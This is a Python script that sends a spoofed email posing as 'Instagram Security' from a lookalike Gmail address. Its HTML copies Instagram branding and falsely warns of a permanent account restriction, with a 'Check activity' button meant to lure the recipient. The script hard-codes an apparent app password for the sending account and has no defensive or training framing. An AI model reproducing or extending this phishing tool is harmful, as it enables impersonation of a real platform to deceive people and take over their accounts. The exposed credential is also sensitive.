import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_email():
    
    sender_name = "Instagram Security"
    sender_email = 'instagramloginalertsecure@gmail.com'
    receiver_email = 'ashishsamal123456789@gmail.com'
    password = 'snkw tzif lxdj dzjz'  # Replace with your email password

    
    msg = MIMEMultipart('alternative')
    msg['From'] = f"{sender_name} <{sender_email}>"
    msg['To'] = receiver_email
    msg['Subject'] = 'Suspicious activity detected'

    # Create the HTML message
    html_content = """
  <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        .insta-page{
            font-size: x-large;
            width: 90%;
            display: block;
            justify-content: center;
            align-items: center;
            margin-left: 30px;
            margin-right: 30px;
            margin-top: 50px;
            font-family: 'Helvetica', 'Arial', sans-serif;
            line-height: 32px;
            color: rgb(86, 90, 92) 
        }
        .insta-page .logo{
            width: 400px;
        }

        .insta-page .meta{
        margin-top: 0px;
        width: 100px;
        margin-left: 200px;
        margin-bottom: 0px;
        }

        .insta-page .copyright{
           font-size: medium;
           line-height: 12px;
           text-align: center;
           margin-top: -40px;
        }

        .insta-help{
            display: block;
            justify-content: center;
            align-items: center;
            font-size:x-large;
            width: 90%;
            margin-left: 30px;
            margin-right: 30px;
            margin-top: 10px;
            margin-bottom: 0px;
            font-family: 'Helvetica', 'Arial', sans-serif;
            line-height: 32px;
            color: rgb(86, 90, 92)
        }
        button{
            margin-top: 20px;
            margin-left: 5px;
            border-radius: 10px;
            width: 500px;
            font-size: xx-large;
            height: 80px;
            color: white;
            border: none;
            background-color: rgb(71, 162, 234);
            align-self: center;
        }
        .colored-text{
            text-decoration: none;
            font-size: x-large;
            color: rgb(27, 116, 228);
        }
    </style>
</head>
<body>
    <div class = "insta-page" >
        <img class = "logo" src="https://drive.google.com/uc?export=download&id=1nVJrXVbvJ4cQ5-t45WmfwqwK_IL2fUVz
        ">
        <p>
            Hi aaa.sheesh,<br>
            <span style="margin-top: 10px; display: block">
                We have detected unsual activity from your account on multiple occassions, henceforth resulting in a permanent restriction due to violation of instagram guidelines.
            </span>
            <button>
  Check activity
</button>
        </p>
    </div>
    <div class = "insta-help">
        <p>
            Please check community guidelines and <a  class = "colored-text" href="https://help.instagram.com/231141655544451">learn more about why you may have received it.</a>
        </p>
    </div>
    <div class = "insta-help" style="margin-top: 0px;">
        <p>
            Only people who know your Instagram password or click the login link in this email can log into your account.
        </p>
    </div>
    <div class = "insta-page" style="margin-top: 0px;">
        <img class = "meta" src="https://drive.google.com/uc?export=download&id=1Pse5r5LZB-F5anL-ZYUrmmOXBTVRh3WM

        ">
    </div>
    <div class = "insta-page">
        <p class = "copyright">&#169; Instagram. Meta Platforms, Inc., 1601 Willow Road, Menlo Park, CA 94025
            This message was sent to ashishsamal100@gmail.com and intended for aaa.sheesh. Not your account? Remove your email from this account.</p>
    </div>

</body>
</html>
    """

    # Record the MIME types of both parts - HTML and plain text.
    part_html = MIMEText(html_content, 'html')

    # Attach HTML parts to the message
    msg.attach(part_html)

    # Connect to the SMTP server and send the email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_email, password)
        server.send_message(msg)
        print("Email sent successfully!")

# Call the function to send the email
send_email()
